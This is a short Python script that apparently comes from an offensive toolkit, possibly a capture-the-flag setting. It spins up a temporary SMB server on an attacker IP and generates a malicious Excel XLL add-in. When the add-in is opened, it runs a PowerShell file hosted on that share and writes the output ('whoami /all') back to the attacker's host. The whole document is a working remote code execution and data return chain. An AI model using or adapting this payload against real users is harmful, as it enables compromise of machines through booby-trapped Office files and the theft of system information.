from payload import CRunPowershellXll
from tempsmbserver import TempSMB

local_ip = "10.10.16.36"


with TempSMB(local_ip=local_ip) as smb:
    powershell_payload = "whoami /all"
    return_channel = smb.future_file(ext=".out")
    powershell_file = smb.create_temp_file(f"{powershell_payload} > {return_channel.remote_path}", ext=".ps1")
    xll_payload = CRunPowershellXll(smb, [powershell_file])
    print(xll_payload.file.local_path)
    return_channel.await_me()
    return_channel.print(cringe_utf_16=True)
